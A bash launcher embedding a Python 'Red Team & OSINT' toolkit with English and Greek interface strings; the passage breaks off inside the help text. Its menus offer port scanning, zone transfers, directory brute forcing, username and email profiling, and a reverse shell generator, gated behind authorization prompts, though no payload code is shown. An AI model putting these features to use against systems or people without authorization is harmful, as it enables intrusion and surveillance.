#!/usr/bin/env bash
set -uo pipefail

find_python() {
    if command -v python3 >/dev/null 2>&1; then
        printf '%s' python3
        return 0
    fi
    if command -v python >/dev/null 2>&1 && python -c 'import sys; raise SystemExit(sys.version_info.major != 3)' >/dev/null 2>&1; then
        printf '%s' python
        return 0
    fi
    return 1
}

run_admin() {
    if [ "$(id -u 2>/dev/null || printf '1')" = "0" ]; then
        "$@"
    elif command -v sudo >/dev/null 2>&1; then
        sudo "$@"
    else
        "$@"
    fi
}

install_python() {
    printf '%s\n' 'Python 3 is missing. Installing it automatically...' 'Το Python 3 λείπει. Γίνεται αυτόματη εγκατάσταση...'
    if command -v pkg >/dev/null 2>&1; then
        pkg install -y python
    elif command -v apt-get >/dev/null 2>&1; then
        run_admin apt-get update && run_admin apt-get install -y python3 python3-pip python3-venv
    elif command -v dnf >/dev/null 2>&1; then
        run_admin dnf install -y python3 python3-pip
    elif command -v yum >/dev/null 2>&1; then
        run_admin yum install -y python3 python3-pip
    elif command -v pacman >/dev/null 2>&1; then
        run_admin pacman -Sy --noconfirm python python-pip
    elif command -v apk >/dev/null 2>&1; then
        run_admin apk add python3 py3-pip
    elif command -v zypper >/dev/null 2>&1; then
        run_admin zypper --non-interactive install python3 python3-pip
    elif command -v brew >/dev/null 2>&1; then
        brew install python
    else
        printf '%s\n' 'No supported package manager was found. Install Python 3 and run the script again.' 'Δεν βρέθηκε υποστηριζόμενος package manager. Εγκαταστήστε Python 3 και εκτελέστε ξανά το script.'
        return 1
    fi
}


install_pip() {
    if "$PYTHON_BIN" -m pip --version >/dev/null 2>&1; then
        return 0
    fi
    "$PYTHON_BIN" -m ensurepip --upgrade >/dev/null 2>&1 || true
    if "$PYTHON_BIN" -m pip --version >/dev/null 2>&1; then
        return 0
    fi
    printf '%s\n' 'Python pip is missing. Installing it automatically...' 'Το Python pip λείπει. Γίνεται αυτόματη εγκατάσταση...'
    if command -v pkg >/dev/null 2>&1; then
        pkg install -y python
    elif command -v apt-get >/dev/null 2>&1; then
        run_admin apt-get update && run_admin apt-get install -y python3-pip python3-venv
    elif command -v dnf >/dev/null 2>&1; then
        run_admin dnf install -y python3-pip
    elif command -v yum >/dev/null 2>&1; then
        run_admin yum install -y python3-pip
    elif command -v pacman >/dev/null 2>&1; then
        run_admin pacman -Sy --noconfirm python-pip
    elif command -v apk >/dev/null 2>&1; then
        run_admin apk add py3-pip
    elif command -v zypper >/dev/null 2>&1; then
        run_admin zypper --non-interactive install python3-pip
    elif command -v brew >/dev/null 2>&1; then
        brew reinstall python
    fi
    "$PYTHON_BIN" -m pip --version >/dev/null 2>&1
}

PYTHON_BIN=$(find_python || true)
if [ -z "$PYTHON_BIN" ]; then
    install_python || exit 1
    PYTHON_BIN=$(find_python || true)
fi
if [ -z "$PYTHON_BIN" ]; then
    printf '%s\n' 'Python 3 could not be started.' 'Το Python 3 δεν μπόρεσε να ξεκινήσει.'
    exit 1
fi

AUTO_INSTALL=1
if [ "${CHAKRAVYUH_NO_AUTO_INSTALL:-}" = "1" ]; then
    AUTO_INSTALL=0
fi
for ARG in "$@"; do
    case "$ARG" in
        --no-install|--help|-h|help|self-test) AUTO_INSTALL=0 ;;
    esac
done
if [ "$AUTO_INSTALL" = "1" ]; then
    install_pip || true
fi

export PYTHONUNBUFFERED=1
exec "$PYTHON_BIN" /dev/fd/3 "$@" 3<<'PYTHON'
import argparse
import base64
import concurrent.futures
import datetime
import getpass
import importlib
import importlib.util
import ipaddress
import json
import os
import pathlib
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import webbrowser

APP_NAME = "Chakravyuh Red Team & OSINT Suite"
HOME = pathlib.Path.home()
CONFIG_DIR = pathlib.Path(os.environ.get("XDG_CONFIG_HOME", HOME / ".config")) / "chakravyuh"
DATA_DIR = pathlib.Path(os.environ.get("XDG_DATA_HOME", HOME / ".local" / "share")) / "chakravyuh"
PYTHON_PACKAGE_DIR = DATA_DIR / "python-packages"
if PYTHON_PACKAGE_DIR.is_dir():
    sys.path.insert(0, str(PYTHON_PACKAGE_DIR))
CONFIG_FILE = CONFIG_DIR / "config.json"
API_KEYS_FILE = CONFIG_DIR / "apikeys.json"
REPORT_DIR = pathlib.Path(os.environ.get("CHAKRAVYUH_REPORT_DIR", HOME / "Chakravyuh-Reports"))
MAX_PORTS = 256
MAX_WORDS = 10000
LANG = "en"
MODULES = {}
PACKAGE_MAP = {
    "requests": "requests",
    "dns": "dnspython",
    "phonenumbers": "phonenumbers",
    "whois": "python-whois",
    "bs4": "beautifulsoup4",
    "qrcode": "qrcode",
    "PIL": "Pillow",
}
TEXT = {'en': {'choose_language': 'Choose language / Επιλέξτε γλώσσα\n[1] English\n[2] Ελληνικά\n> ',
        'title': 'Chakravyuh Red Team & OSINT Suite',
        'menu': '\n'
                '=== OSINT ===\n'
                '[1] IP / Network Recon\n'
                '[2] Domain Intelligence (whois, DNS, subdomains)\n'
                '[3] Email OSINT & HIBP breach check\n'
                '[4] Phone number validation\n'
                '[5] Username search (social media)\n'
                '[6] MAC vendor lookup\n'
                '[7] ASN / IP range info\n'
                '[8] Google dork generator\n'
                '[9] Pastebin keyword search\n'
                '=== Red Team ===\n'
                '[10] SSL / TLS certificate analysis\n'
                '[11] HTTP security headers audit\n'
                '[12] Port scanning (TCP) [authorized]\n'
                '[13] DNS zone transfer [authorized]\n'
                '[14] Web directory brute force [authorized]\n'
                '[15] Web technology fingerprint\n'
                '[16] Reverse shell generator [authorized lab]\n'
                '=== Tools & APIs ===\n'
                '[17] Metadata extraction (EXIF)\n'
                '[18] VirusTotal hash lookup\n'
                '[19] Shodan host lookup\n'
                '[20] Censys host lookup\n'
                '[21] QR code generator\n'
                '=== System ===\n'
                '[22] View reports\n'
                '[23] Settings\n'
                '[24] API key management\n'
                '[0] Exit\n'
                '> ',
        'ip_menu': '\n'
                   '[1] My public IP\n'
                   '[2] IP lookup (geolocation, whois, reverse IP)\n'
                   '[3] Reverse IP (domains on same IP)\n'
                   '[0] Back\n'
                   '> ',
        'invalid': 'Invalid choice.',
        'press_enter': 'Press Enter to continue...',
        'target': 'Enter an IP, hostname, or URL: ',
        'domain': 'Enter a domain or hostname: ',
        'phone': 'Enter a phone number (local numbers assumed Greek): ',
        'email': 'Enter email address: ',
        'username': 'Enter username: ',
        'mac': 'Enter MAC address (e.g. 00:11:22:33:44:55): ',
        'asn_input': 'Enter IP or ASN (e.g. AS15169 or 8.8.8.8): ',
        'ssl_target': 'Enter hostname for SSL certificate: ',
        'headers_target': 'Enter URL (with http/https) for header audit: ',
        'metadata_file': 'Enter file path for metadata extraction: ',
        'dork_query': 'Enter Google dork query (e.g. site:example.com filetype:pdf): ',
        'pastebin_keyword': 'Enter keyword to search on Pastebin: ',
        'vt_hash': 'Enter file hash (MD5/SHA1/SHA256): ',
        'shodan_target': 'Enter IP/hostname for Shodan lookup: ',
        'censys_target': 'Enter IP for Censys lookup: ',
        'qr_text': 'Enter text or URL for QR code: ',
        'working': 'Working...',
        'network_error': 'Online service unreachable. Check your connection.',
        'invalid_target': 'The target is invalid or could not be resolved.',
        'public_ip': 'Public IP',
        'resolved_ip': 'Resolved IP',
        'type': 'Type',
        'private': 'Private/local',
        'public': 'Public',
        'country': 'Country',
        'region': 'Region',
        'city': 'City',
        'isp': 'ISP',
        'asn': 'ASN',
        'timezone': 'Time zone',
        'coordinates': 'Coordinates',
        'map_prompt': 'Open approximate location in OpenStreetMap? [y/N]: ',
        'saved': 'Report saved:',
        'dns_for': 'DNS records for',
        'ipv4': 'A records',
        'ipv6': 'AAAA records',
        'mx': 'MX records',
        'ns': 'NS records',
        'txt': 'TXT records',
        'soa': 'SOA records',
        'cname': 'CNAME records',
        'reverse': 'PTR records',
        'no_records': 'No records found.',
        'whois_header': 'WHOIS information',
        'subdomains_found': 'Subdomains found (crt.sh):',
        'no_subdomains': 'No subdomains discovered.',
        'email_valid_format': 'Format valid.',
        'email_invalid_format': 'Format invalid.',
        'email_mx_ok': 'Mail server (MX) exists.',
        'email_mx_missing': 'No MX record – domain cannot receive email.',
        'email_breach': 'Data breaches (Have I Been Pwned):',
        'email_breach_clean': 'No known breaches found.',
        'email_verify_ok': 'Email address appears deliverable.',
        'email_verify_fail': 'SMTP verification failed or not supported.',
        'phone_valid': 'Number valid.',
        'phone_possible': 'Number possible but not fully verified.',
        'phone_invalid': 'Number invalid.',
        'normalized': 'Normalized',
        'phone_region': 'Country',
        'carrier': 'Carrier',
        'phone_timezone': 'Time zone',
        'phone_type': 'Type',
        'username_found': 'Username found on platforms:',
        'username_not_found': 'Username not found on any checked platform.',
        'username_checking': 'Checking platforms...',
        'mac_vendor': 'Vendor / Organisation',
        'mac_address': 'MAC address',
        'asn_info': 'ASN information',
        'asn_prefixes': 'Advertised prefixes',
        'asn_name': 'AS name',
        'asn_country': 'Country',
        'ssl_subject': 'Subject',
        'ssl_issuer': 'Issuer',
        'ssl_valid_from': 'Valid from',
        'ssl_valid_until': 'Valid until',
        'ssl_san': 'Subject Alternative Names',
        'ssl_error': 'SSL connection failed.',
        'headers_title': 'Security Headers Audit',
        'headers_missing': 'Missing or misconfigured headers:',
        'headers_present': 'Present security headers:',
        'headers_grade': 'Overall grade: {}/{}',
        'scan_target': 'Enter target IP/hostname you are authorized to test: ',
        'scan_presets': 'Choose port set:\n[1] Top 20\n[2] Web\n[3] Remote access\n[4] Custom\n> ',
        'custom_ports': 'Enter ports (comma/range, max 256): ',
        'authorization': 'Type YES to confirm you own the target or have explicit permission: ',
        'not_authorized': 'Audit cancelled – no authorization.',
        'too_many_ports': 'Maximum 256 TCP ports allowed.',
        'scanning': 'Scanning',
        'open_ports': 'Open ports',
        'none_open': 'No open TCP ports found.',
        'banner': 'Banner',
        'zone_transfer_ok': 'Zone transfer successful. Records:',
        'zone_transfer_fail': 'Zone transfer failed or not permitted.',
        'dirb_auth': 'Type YES to confirm you are authorized to scan this web server: ',
        'dirb_wordlist': 'Enter path to wordlist file: ',
        'dirb_start': 'Directory brute force started (press Ctrl+C to stop)...',
        'dirb_found': 'Found:',
        'tech_target': 'Enter URL (including http/https): ',
        'tech_title': 'Technology fingerprint',
        'server_header': 'Server header',
        'powered_by': 'X-Powered-By',
        'generator': 'Generator meta',
        'cookies': 'Cookies set',
        'frameworks': 'Possible frameworks',
        'reverse_menu': 'Payload type:\n[1] bash\n[2] Python\n[3] netcat (nc)\n[4] PHP\n[5] PowerShell\n> ',
        'lhost': 'LHOST (your IP): ',
        'lport': 'LPORT: ',
        'shell_cmd': 'Generated reverse shell:',
        'metadata_title': 'Metadata extraction',
        'metadata_error': 'Could not extract metadata. Install exiftool or pillow.',
        'metadata_no_exif': 'No EXIF data found.',
        'dork_result': 'Generated Google dork link:',
        'pastebin_no_results': 'No results found or error.',
        'pastebin_results': 'Pastebin results:',
        'vt_report': 'VirusTotal report:',
        'vt_error': 'VirusTotal query failed. Check API key or hash.',
        'shodan_info': 'Shodan information:',
        'shodan_error': 'Shodan query failed. Check API key.',
        'censys_info': 'Censys information:',
        'censys_error': 'Censys query failed. Check API key.',
        'qr_saved': 'QR code saved as:',
        'qr_fail': "QR code generation failed. Install 'qrcode' and 'Pillow'.",
        'apikey_menu': '\n'
                       '[1] Set Shodan API key\n'
                       '[2] Set VirusTotal API key\n'
                       '[3] Set HIBP API key\n'
                       '[4] Set Censys Personal Access Token\n'
                       '[5] Set optional Censys organization ID\n'
                       '[6] Show saved keys (masked)\n'
                       '[7] Remove a saved key\n'
                       '[0] Back\n'
                       '> ',
        'apikey_service': 'Enter service name (shodan/virustotal/censys): ',
        'apikey_value': 'Enter API key: ',
        'apikey_set': 'API key saved.',
        'apikey_show': 'Saved API keys:',
        'reports_empty': 'No saved reports.',
        'reports_title': 'Saved reports',
        'report_action': 'Enter report number to view, D to delete, Enter to return: ',
        'delete_number': 'Enter report number to delete: ',
        'deleted': 'Report deleted.',
        'settings': '\n'
                    '[1] Change language\n'
                    '[2] Show storage paths\n'
                    '[3] Delete all reports\n'
                    '[4] Run offline self-test\n'
                    '[5] Dependency doctor\n'
                    '[0] Back\n'
                    '> ',
        'storage': 'Config: {config}\nReports: {reports}',
        'confirm_delete_all': 'Type DELETE to erase all reports: ',
        'all_deleted': 'All reports deleted.',
        'language_changed': 'Language changed.',
        'goodbye': 'Goodbye.',
        'self_test_ok': 'All self-tests passed.',
        'self_test_fail': 'Self-test failure:',
        'unknown': 'Unknown',
        'need_exiftool': 'Install Pillow or exiftool to read metadata.',
        'cli_auth': 'This command requires --authorized.',
        'file_not_found': 'File not found.',
        'wordlist_not_found': 'Wordlist file not found.',
        'no_dirs': 'No matching directories were found.',
        'dependency_unavailable': 'Required dependency is unavailable.',
        'api_key_missing': 'Required API key is not configured.',
        'invalid_ports': 'The port list is invalid.',
        'too_many_words': 'The wordlist is too large; only the first 10,000 entries will be tested.',
        'authorization_active': 'Type YES to confirm this active test is within your authorized scope: ',
        'report_read_error': 'Could not read report:',
        'installer_failed': 'Automatic dependency installation failed. Limited fallback mode will be used.',
        'doctor_title': 'Dependency status',
        'available': 'Available',
        'missing': 'Missing',
        'offline_test': 'Offline self-test',
        'hibp_unavailable': 'HIBP lookup requires a configured API key.',
        'smtp_notice': 'SMTP verification is active, unreliable, and must only be used with authorization.',
        'reverse_notice': 'Generated payloads are for isolated, authorized lab use only.',
        'invalid_url': 'Enter a valid HTTP or HTTPS URL.',
        'invalid_hash': 'Enter a valid MD5, SHA-1, or SHA-256 hash.',
        'invalid_mac': 'Enter a valid MAC address.',
        'invalid_email': 'Enter a valid email address.',
        'api_removed': 'Saved value removed.',
        'nothing_set': 'Nothing is configured for that service.',
        'installing': 'Installing missing Python packages',
        'install_skipped': 'Automatic package installation is disabled.',
        'network_test_skipped': 'Online APIs are not contacted by the self-test.'},
 'gr': {'choose_language': 'Choose language / Επιλέξτε γλώσσα\n[1] English\n[2] Ελληνικά\n> ',
        'title': 'Chakravyuh Red Team & OSINT Suite',
        'menu': '\n'
                '=== OSINT ===\n'
                '[1] Αναγνώριση IP / Δικτύου\n'
                '[2] Πληροφορίες Domain (whois, DNS, υποτομείς)\n'
                '[3] Email OSINT & έλεγχος HIBP\n'
                '[4] Επικύρωση αριθμού τηλεφώνου\n'
                '[5] Αναζήτηση ονόματος χρήστη (social media)\n'
                '[6] Αναγνώριση MAC vendor\n'
                '[7] Πληροφορίες ASN / IP range\n'
                '[8] Γεννήτρια Google dork\n'
                '[9] Αναζήτηση στο Pastebin\n'
                '=== Red Team ===\n'
                '[10] Ανάλυση πιστοποιητικού SSL/TLS\n'
                '[11] Έλεγχος κεφαλίδων ασφαλείας HTTP\n'
                '[12] Σάρωση θυρών (TCP) [εξουσιοδοτημένη]\n'
                '[13] DNS zone transfer [εξουσιοδοτημένη]\n'
                '[14] Web directory brute force [εξουσιοδοτημένη]\n'
                '[15] Αποτύπωμα τεχνολογίας web\n'
                '[16] Γεννήτρια reverse shell [εξουσιοδοτημένο εργαστήριο]\n'
                '=== Εργαλεία & APIs ===\n'
                '[17] Εξαγωγή μεταδεδομένων (EXIF)\n'
                '[18] Αναζήτηση hash στο VirusTotal\n'
                '[19] Αναζήτηση στο Shodan\n'
                '[20] Αναζήτηση στο Censys\n'
                '[21] Δημιουργία QR code\n'
                '=== Σύστημα ===\n'
                '[22] Προβολή αναφορών\n'
                '[23] Ρυθμίσεις\n'
                '[24] Διαχείριση API keys\n'
                '[0] Έξοδος\n'
                '> ',
        'ip_menu': '\n'
                   '[1] Η δημόσια IP μου\n'
                   '[2] Αναζήτηση IP (γεωεντόπιση, whois, reverse IP)\n'
                   '[3] Reverse IP (domains στην ίδια IP)\n'
                   '[0] Πίσω\n'
                   '> ',
        'invalid': 'Μη έγκυρη επιλογή.',
        'press_enter': 'Πατήστε Enter για συνέχεια...',
        'target': 'Εισάγετε IP, hostname ή URL: ',
        'domain': 'Εισάγετε domain ή hostname: ',
        'phone': 'Εισάγετε αριθμό τηλεφώνου (οι τοπικοί θεωρούνται ελληνικοί): ',
        'email': 'Εισάγετε email: ',
        'username': 'Εισάγετε όνομα χρήστη: ',
        'mac': 'Εισάγετε MAC (π.χ. 00:11:22:33:44:55): ',
        'asn_input': 'Εισάγετε IP ή ASN (π.χ. AS15169 ή 8.8.8.8): ',
        'ssl_target': 'Εισάγετε hostname για πιστοποιητικό SSL: ',
        'headers_target': 'Εισάγετε URL (με http/https) για έλεγχο κεφαλίδων: ',
        'metadata_file': 'Εισάγετε διαδρομή αρχείου για εξαγωγή μεταδεδομένων: ',
        'dork_query': 'Εισάγετε το ερώτημα Google dork: ',
        'pastebin_keyword': 'Εισάγετε λέξη-κλειδί για αναζήτηση στο Pastebin: ',
        'vt_hash': 'Εισάγετε hash αρχείου (MD5/SHA1/SHA256): ',
        'shodan_target': 'Εισάγετε IP/hostname για Shodan: ',
        'censys_target': 'Εισάγετε IP για Censys: ',
        'qr_text': 'Εισάγετε κείμενο ή URL για QR code: ',
        'working': 'Επεξεργασία...',
        'network_error': 'Αδυναμία σύνδεσης. Ελέγξτε τη σύνδεσή σας.',
        'invalid_target': 'Μη έγκυρος στόχος ή δεν επιλύεται.',
        'public_ip': 'Δημόσια IP',
        'resolved_ip': 'IP που επιλύθηκε',
        'type': 'Τύπος',
        'private': 'Ιδιωτική/τοπική',
        'public': 'Δημόσια',
        'country': 'Χώρα',
        'region': 'Περιοχή',
        'city': 'Πόλη',
        'isp': 'Πάροχος',
        'asn': 'ASN',
        'timezone': 'Ζώνη ώρας',
        'coordinates': 'Συντεταγμένες',
        'map_prompt': 'Άνοιγμα τοποθεσίας στο OpenStreetMap; [ν/Ο]: ',
        'saved': 'Η αναφορά αποθηκεύτηκε:',
        'dns_for': 'Εγγραφές DNS για',
        'ipv4': 'Εγγραφές A',
        'ipv6': 'Εγγραφές AAAA',
        'mx': 'Εγγραφές MX',
        'ns': 'Εγγραφές NS',
        'txt': 'Εγγραφές TXT',
        'soa': 'Εγγραφές SOA',
        'cname': 'Εγγραφές CNAME',
        'reverse': 'Εγγραφές PTR',
        'no_records': 'Δεν βρέθηκαν εγγραφές.',
        'whois_header': 'Πληροφορίες WHOIS',
        'subdomains_found': 'Υποτομείς που βρέθηκαν (crt.sh):',
        'no_subdomains': 'Δεν βρέθηκαν υποτομείς.',
        'email_valid_format': 'Μορφή έγκυρη.',
        'email_invalid_format': 'Μη έγκυρη μορφή.',
        'email_mx_ok': 'Υπάρχει mail server (MX).',
        'email_mx_missing': 'Δεν υπάρχει MX – ο τομέας δεν δέχεται email.',
        'email_breach': 'Παραβιάσεις δεδομένων (Have I Been Pwned):',
        'email_breach_clean': 'Δεν βρέθηκαν γνωστές παραβιάσεις.',
        'email_verify_ok': 'Η διεύθυνση φαίνεται παραδοτέα.',
        'email_verify_fail': 'Η επαλήθευση SMTP απέτυχε ή δεν υποστηρίζεται.',
        'phone_valid': 'Έγκυρος αριθμός.',
        'phone_possible': 'Πιθανός αριθμός αλλά όχι πλήρως επιβεβαιωμένος.',
        'phone_invalid': 'Μη έγκυρος αριθμός.',
        'normalized': 'Κανονικοποιημένος',
        'phone_region': 'Χώρα',
        'carrier': 'Πάροχος',
        'phone_timezone': 'Ζώνη ώρας',
        'phone_type': 'Τύπος',
        'username_found': 'Το όνομα χρήστη βρέθηκε στις πλατφόρμες:',
        'username_not_found': 'Δεν βρέθηκε σε καμία ελεγμένη πλατφόρμα.',
        'username_checking': 'Έλεγχος πλατφορμών...',
        'mac_vendor': 'Κατασκευαστής / Οργανισμός',
        'mac_address': 'MAC address',
        'asn_info': 'Πληροφορίες ASN',
        'asn_prefixes': 'Διαφημιζόμενα prefixes',
        'asn_name': 'Όνομα AS',
        'asn_country': 'Χώρα',
        'ssl_subject': 'Θέμα',
        'ssl_issuer': 'Εκδότης',
        'ssl_valid_from': 'Έναρξη ισχύος',
        'ssl_valid_until': 'Λήξη',
        'ssl_san': 'Subject Alternative Names',
        'ssl_error': 'Η σύνδεση SSL απέτυχε.',
        'headers_title': 'Έλεγχος κεφαλίδων ασφαλείας',
        'headers_missing': 'Κεφαλίδες που λείπουν ή έχουν λάθος ρύθμιση:',
        'headers_present': 'Υπάρχουσες κεφαλίδες ασφαλείας:',
        'headers_grade': 'Συνολική βαθμολογία: {}/{}',
        'scan_target': 'Δώστε IP/hostname που έχετε άδεια να ελέγξετε: ',
        'scan_presets': 'Επιλέξτε σύνολο θυρών:\n'
                        '[1] Top 20\n'
                        '[2] Web\n'
                        '[3] Απομακρυσμένη πρόσβαση\n'
                        '[4] Προσαρμοσμένο\n'
                        '> ',
        'custom_ports': 'Εισάγετε θύρες (κόμμα/εύρος, μέγιστο 256): ',
        'authorization': 'Γράψτε ΝΑΙ για επιβεβαίωση άδειας: ',
        'not_authorized': 'Ο έλεγχος ακυρώθηκε – δεν δόθηκε άδεια.',
        'too_many_ports': 'Μέγιστο 256 θύρες TCP.',
        'scanning': 'Σάρωση',
        'open_ports': 'Ανοιχτές θύρες',
        'none_open': 'Δεν βρέθηκαν ανοιχτές θύρες.',
        'banner': 'Banner',
        'zone_transfer_ok': 'Επιτυχής μεταφορά ζώνης. Εγγραφές:',
        'zone_transfer_fail': 'Αποτυχία μεταφοράς ζώνης.',
        'dirb_auth': 'Γράψτε ΝΑΙ για επιβεβαίωση ότι έχετε άδεια να σαρώσετε αυτόν τον διακομιστή: ',
        'dirb_wordlist': 'Δώστε διαδρομή αρχείου λίστας λέξεων: ',
        'dirb_start': 'Έναρξη brute force καταλόγων (Ctrl+C για διακοπή)...',
        'dirb_found': 'Βρέθηκε:',
        'tech_target': 'Εισάγετε URL (με http/https): ',
        'tech_title': 'Αποτύπωμα τεχνολογίας',
        'server_header': 'Κεφαλίδα Server',
        'powered_by': 'X-Powered-By',
        'generator': 'Meta generator',
        'cookies': 'Cookies',
        'frameworks': 'Πιθανά frameworks',
        'reverse_menu': 'Τύπος payload:\n[1] bash\n[2] Python\n[3] netcat (nc)\n[4] PHP\n[5] PowerShell\n> ',
        'lhost': 'LHOST (η IP σας): ',
        'lport': 'LPORT: ',
        'shell_cmd': 'Παραγόμενο reverse shell:',
        'metadata_title': 'Εξαγωγή μεταδεδομένων',
        'metadata_error': 'Αδυναμία εξαγωγής. Εγκαταστήστε exiftool ή pillow.',
        'metadata_no_exif': 'Δεν βρέθηκαν δεδομένα EXIF.',
        'dork_result': 'Σύνδεσμος Google dork:',
        'pastebin_no_results': 'Δεν βρέθηκαν αποτελέσματα ή σφάλμα.',
        'pastebin_results': 'Αποτελέσματα Pastebin:',
        'vt_report': 'Αναφορά VirusTotal:',
        'vt_error': 'Αποτυχία ερωτήματος VirusTotal. Ελέγξτε το API key.',
        'shodan_info': 'Πληροφορίες Shodan:',
        'shodan_error': 'Αποτυχία ερωτήματος Shodan. Ελέγξτε το API key.',
        'censys_info': 'Πληροφορίες Censys:',
        'censys_error': 'Αποτυχία ερωτήματος Censys. Ελέγξτε το API key.',
        'qr_saved': 'Το QR code αποθηκεύτηκε ως:',
        'qr_fail': "Αποτυχία δημιουργίας QR code. Εγκαταστήστε τα 'qrcode' και 'Pillow'.",
        'apikey_menu': '\n'
                       '[1] Ορισμός Shodan API key\n'
                       '[2] Ορισμός VirusTotal API key\n'
                       '[3] Ορισμός HIBP API key\n'
                       '[4] Ορισμός Censys Personal Access Token\n'
                       '[5] Ορισμός προαιρετικού Censys organization ID\n'
                       '[6] Προβολή αποθηκευμένων κλειδιών (κρυμμένα)\n'
                       '[7] Αφαίρεση αποθηκευμένου κλειδιού\n'
                       '[0] Πίσω\n'
                       '> ',
        'apikey_service': 'Εισάγετε όνομα υπηρεσίας (shodan/virustotal/censys): ',
        'apikey_value': 'Εισάγετε το API key: ',
        'apikey_set': 'Το API key αποθηκεύτηκε.',
        'apikey_show': 'Αποθηκευμένα API keys:',
        'reports_empty': 'Δεν υπάρχουν αποθηκευμένες αναφορές.',
        'reports_title': 'Αποθηκευμένες αναφορές',
        'report_action': 'Αριθμός αναφοράς για προβολή, D για διαγραφή, Enter για επιστροφή: ',
        'delete_number': 'Αριθμός αναφοράς προς διαγραφή: ',
        'deleted': 'Η αναφορά διαγράφηκε.',
        'settings': '\n'
                    '[1] Αλλαγή γλώσσας\n'
                    '[2] Προβολή διαδρομών αποθήκευσης\n'
                    '[3] Διαγραφή όλων των αναφορών\n'
                    '[4] Εκτέλεση offline αυτοελέγχου\n'
                    '[5] Έλεγχος εξαρτήσεων\n'
                    '[0] Πίσω\n'
                    '> ',
        'storage': 'Ρυθμίσεις: {config}\nΑναφορές: {reports}',
        'confirm_delete_all': 'Γράψτε ΔΙΑΓΡΑΦΗ για διαγραφή όλων: ',
        'all_deleted': 'Όλες οι αναφορές διαγράφηκαν.',
        'language_changed': 'Η γλώσσα άλλαξε.',
        'goodbye': 'Αντίο.',
        'self_test_ok': 'Όλοι οι αυτοέλεγχοι επιτυχείς.',
        'self_test_fail': 'Αποτυχία αυτοελέγχου:',
        'unknown': 'Άγνωστο',
        'need_exiftool': 'Εγκαταστήστε Pillow ή exiftool για ανάγνωση μεταδεδομένων.',
        'cli_auth': 'Αυτή η εντολή απαιτεί --authorized.',
        'file_not_found': 'Το αρχείο δεν βρέθηκε.',
        'wordlist_not_found': 'Το αρχείο λίστας λέξεων δεν βρέθηκε.',
        'no_dirs': 'Δεν βρέθηκαν αντίστοιχοι κατάλογοι.',
        'dependency_unavailable': 'Η απαιτούμενη εξάρτηση δεν είναι διαθέσιμη.',
        'api_key_missing': 'Το απαιτούμενο API key δεν έχει ρυθμιστεί.',
        'invalid_ports': 'Η λίστα θυρών δεν είναι έγκυρη.',
        'too_many_words': 'Η λίστα είναι πολύ μεγάλη· θα ελεγχθούν μόνο οι πρώτες 10.000 εγγραφές.',
        'authorization_active': 'Γράψτε ΝΑΙ για επιβεβαίωση ότι αυτός ο ενεργός έλεγχος βρίσκεται στο '
                                'εξουσιοδοτημένο πεδίο σας: ',
        'report_read_error': 'Αδυναμία ανάγνωσης αναφοράς:',
        'installer_failed': 'Η αυτόματη εγκατάσταση εξαρτήσεων απέτυχε. Θα χρησιμοποιηθεί περιορισμένη '
                            'λειτουργία.',
        'doctor_title': 'Κατάσταση εξαρτήσεων',
        'available': 'Διαθέσιμο',
        'missing': 'Λείπει',
        'offline_test': 'Offline αυτοέλεγχος',
        'hibp_unavailable': 'Η αναζήτηση HIBP απαιτεί ρυθμισμένο API key.',
        'smtp_notice': 'Η επαλήθευση SMTP είναι ενεργή, αναξιόπιστη και επιτρέπεται μόνο με εξουσιοδότηση.',
        'reverse_notice': 'Τα payloads προορίζονται μόνο για απομονωμένο, εξουσιοδοτημένο εργαστήριο.',
        'invalid_url': 'Εισάγετε έγκυρο HTTP ή HTTPS URL.',
        'invalid_hash': 'Εισάγετε έγκυρο MD5, SHA-1 ή SHA-256 hash.',
        'invalid_mac': 'Εισάγετε έγκυρη διεύθυνση MAC.',
        'invalid_email': 'Εισάγετε έγκυρη διεύθυνση email.',
        'api_removed': 'Η αποθηκευμένη τιμή αφαιρέθηκε.',
        'nothing_set': 'Δεν υπάρχει ρυθμισμένη τιμή για αυτή την υπηρεσία.',
        'installing': 'Εγκατάσταση πακέτων Python που λείπουν',
        'install_skipped': 'Η αυτόματη εγκατάσταση πακέτων είναι απενεργοποιημένη.',
        'network_test_skipped': 'Ο αυτοέλεγχος δεν επικοινωνεί με online APIs.'}}

def t(key):
    return TEXT.get(LANG, TEXT["en"]).get(key, TEXT["en"].get(key, key))


def bi(en, gr):
    return gr if LANG == "gr" else en


def print_help(language="en"):
    greek = language in {"gr", "el"}
    if greek:
        print(f"""{APP_NAME}

Χρήση:
  ./chakravyuh.sh
  ./chakravyuh.sh [--language en|gr|el] ΕΝΤΟΛΗ [ΕΠΙΛΟΓΕΣ]

OSINT:
  myip                         Εμφάνιση δημόσιας IP
  ip TARGET                    Πληροφορίες IP/domain και RDAP
  dns TARGET                   Εγγραφές DNS
  subdomain TARGET             Υποτομείς μέσω crt.sh
  email EMAIL                  Έλεγχος μορφής, MX και HIBP
  phone NUMBER                 Έλεγχος αριθμού τηλεφώνου
  username USERNAME            Αναζήτηση ονόματος χρήστη
  mac MAC                      Αναζήτηση κατασκευαστή MAC
  asn IP|ASN                   Πληροφορίες ASN και prefixes
  ssl TARGET                   Ανάλυση πιστοποιητικού TLS
  headers URL                  Έλεγχος HTTP security headers
  tech URL                     Αποτύπωμα τεχνολογίας web
  metadata FILE                Εξαγωγή EXIF/metadata
  vt-hash HASH                 Αναφορά VirusTotal
  shodan TARGET                Αναφορά Shodan
  censys TARGET                Αναφορά Censys
  dork QUERY                   Δημιουργία Google dork URL
  pastebin KEYWORD             Αναζήτηση αναφορών Pastebin
  qr TEXT                      Δημιουργία QR code

Ενεργοί έλεγχοι με εξουσιοδότηση:
  email-verify EMAIL --authorized
  scan TARGET --ports PORTS --authorized [--banner]
  zone-transfer TARGET --authorized
  dirb URL --wordlist FILE --authorized
  reverse --lhost IP --lport PORT --type TYPE --authorized

Σύστημα:
  reports                      Προβολή αναφορών
  language en|gr|el            Αλλαγή γλώσσας
  apikey SERVICE [VALUE]       Αποθήκευση API key
  apikey-remove SERVICE        Αφαίρεση API key
  doctor                       Έλεγχος εξαρτήσεων
  self-test                    Offline αυτοέλεγχος

Παραδείγματα:
  ./chakravyuh.sh --language gr ip 8.8.8.8
  ./chakravyuh.sh scan 127.0.0.1 --ports 22,80,443 --authorized
  ./chakravyuh.sh apikey shodan

Εκτελείτε ενεργούς ελέγχους μόνο σε συστήματα που σας ανήκουν ή για τα οποία έχετε ρητή άδεια.""")
    else:
        print(f"""{APP_NAME}

Usage:
  ./chakravyuh.sh
